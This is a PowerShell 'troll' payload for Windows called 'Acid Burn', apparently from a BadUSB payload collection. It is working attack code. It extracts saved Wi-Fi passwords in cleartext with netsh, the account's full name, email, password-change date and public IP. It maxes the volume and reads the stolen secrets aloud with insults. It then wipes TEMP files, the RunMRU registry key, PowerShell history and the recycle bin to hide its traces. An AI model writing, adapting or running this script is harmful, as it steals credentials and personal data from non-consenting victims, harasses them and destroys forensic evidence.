#     Title:  Acid Burn

#     Author:  I Am Jakoby

#     Modified By:  DevBubba

#     Status:  Working

#     Mod Status:  No Modification Needed

#     Target:  Windows 7/10/11

#     Description:  This Payload Torments Your Target To The Fullest Extent By Exposing Local Microsoft Info Like Email, Passowrd Length, Current Users Wifi Name, And More With Roasting Your Victum In The Meantime With Such Info

#     Category:  Trolls



$s=New-Object -ComObject SAPI.SpVoice

 function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName

echo "Intro Done"


function Get-RAM {

    try {

    $OS = (Get-WmiObject Win32_OperatingSystem).Name;$OSpos = $OS.IndexOf("|");$OS = $OS.Substring(0, $OSpos)

    $RAM=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1}" -f ($_.sum / 1GB)}
    $RAMpos = $RAM.IndexOf('.')
    $RAM = [int]$RAM.Substring(0,$RAMpos).Trim()

    $lowRAM = "$RAM gigs of ram? might as well use pen and paper"
    
    $okRAM = "$RAM gigs of ram really? I have a calculator with more computing power"
    
    $goodRAM = "$RAM gigs of ram? Can almost guarantee you have a light up keyboard.. you are a wanna be streamer huh?"

    $impressiveRAM = "$RAM gigs of ram? are you serious? a super computer with no security that is funny right there"

    if($RAM -le 4){
       return $lowRAM
    } elseif($RAM -ge 5 -and $RAM -le 12){
       return $okRAM
    } elseif($RAM -ge 13 -and $RAM -le 24){
       return $goodRAM
    } else {
       return $impressiveRAM
    }

    }
  
    catch {Write-Error "Error in search" 
    return $null
    -ErrorAction SilentlyContinue
    }
}

echo "RAM Info Done"

function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return "your public  I P address is $computerPubIP"
}

echo "Pub IP Done"

function Get-Pass {

    try {

    $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
    $pos = $pro.IndexOf(':')
    $pro = $pro.Substring($pos+2).Trim()

    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
    $passPOS = $pass.IndexOf(':')
    $pass = $pass.Substring($passPOS+2).Trim()
    
    if($pro -like '*_5GHz*') {
      $pro = $pro.Trimend('_5GHz')
    } 

    $pwl = $pass.length


    }
 
    catch {Write-Error "No network was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    $badPASS = "$pro is not a very creative name but at least it is not as bad as your wifi password... only $pwl characters long? $pass ...? really..? $pass was the best you could come up with?"
    
    $okPASS = "$pro is not a very creative name but at least you are trying a little bit, your password is $pwl characters long, still trash though.. $pass ...? You can do better"
    
    $goodPASS = "$pro is not a very creative name but At least you are not a total fool... $pwl character long password actually is not bad, but it did not save you from me did it? no..it..did..not! $pass is a decent password though."

    if($pass.length -lt 8) { return $badPASS

    }elseif($pass.length -gt 7 -and $pass.length -lt 12)  { return $okPASS

    }else { return $goodPASS

    }
}

echo "Wifi pass Done"

Function Get-Networks {
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

$WLANProfileNames =@()

$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

Foreach($WLANProfileName in $WLANProfileNames){
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
	
}
return $WLANProfileObjects
}

$Networks = Get-Networks

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118)
$h = [PInvoke]::GetDeviceCaps($hdc, 117)

Function Set-WallPaper {
 
param (
    [parameter(Mandatory=$True)]
    [string]$Image,
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

 function Get-Days_Set {
    try {
 
    $pls = net user $env:UserName | Select-String -Pattern "Password last" ; $pls = [string]$pls
    $plsPOS = $pls.IndexOf("e")
    $pls = $pls.Substring($plsPOS+2).Trim()
    $pls = $pls -replace ".{3}$"
    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
    $DateArray =$time.Split(".")
    $days = [int]$DateArray[0]
    }
	
    catch {Write-Error "Day password set not found" 
    return $null
    -ErrorAction SilentlyContinue
    }

    $newPass = "$pls was the last time you changed your password... You changed your password $days days ago..   I have to applaud you.. at least you change your password often. Still did not stop me! "
    
    $avgPASS = "$pls was the last time you changed your password... it has been $days days since you changed your password, really starting to push it, i mean look i am here. that tells you something " 
    
    $oldPASS = "$pls was the last time you changed your password... it has been $days days since you changed your password, you were basically begging me to hack you, well here i am! "    
    
    if($days -lt 45) { return $newPass

    }elseif($days -gt 44 -and $days -lt 182)  { return $avgPASS

    }else { return $oldPASS

    }
}

echo "Pass last set Done"

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
    
    $emailpos = $email.IndexOf("@")
    
    $domain = $email.Substring($emailpos+1)

    }

    catch {Write-Error "An email was not found" 
    return "you're lucky you do not have your email connected to your account, I would have really had some fun with you then lol"
    -ErrorAction SilentlyContinue
    }
 
    $gmailResponse = "At least you use G Mail.. we should be friends. If you are down just email me back, ill message you at $email. That is your email right?"
    $yahooResponse = "a yahoo account seriously? you are either in your 50's or just got done doing some time, a lot of it.. $email .. this is sad"
    $hotmailResponse = "really?. you have a hotmail account? $email .. I am sending this to the f b I they need to check your hard drive"
    $otherEmailResponse = "I dead ass do not even know what this is.. $email .. hope you did not think it was safe"

    if($email -like '*gmail*') { return $gmailResponse

    }elseif($email -like '*yahoo*')  { return $yahooResponse

    }elseif($email -like '*hotmail*')  { return $hotmailResponse
    
    }else { return $otherEmailResponse}


}

echo "Email Done"

$intro = "$fullName , it has been a long time my friend"

$RAMwarn = Get-RAM  

$PUB_IPwarn = Get-PubIP  

$PASSwarn = Get-Pass

$LAST_PASSwarn =  Get-Days_Set

$EMAILwarn = Get-email 

$OUTRO =  "My crime is that of curiosity.... 	and yea curiosity killed the cat....     but satisfaction brought him back.... later $fullName"

echo "Speak Variables set"

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

echo "Volume to max level"

$popmessage = "Hello $fullName"


$readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)

$blinks = 3;$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds 250}

Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
echo "it worked"

$s=New-Object -ComObject SAPI.SpVoice

$s.Rate = -1

$s.Speak($intro)

$s.Speak($RAMwarn)

$s.Speak($PUB_IPwarn)

$s.Speak($PASSwarn)

$s.Speak($LAST_PASSwarn)

$s.Speak($EMAILwarn)

$s.Speak($OUTRO)

$message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back"

Add-Content $home\Desktop\WithLove.txt $message

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
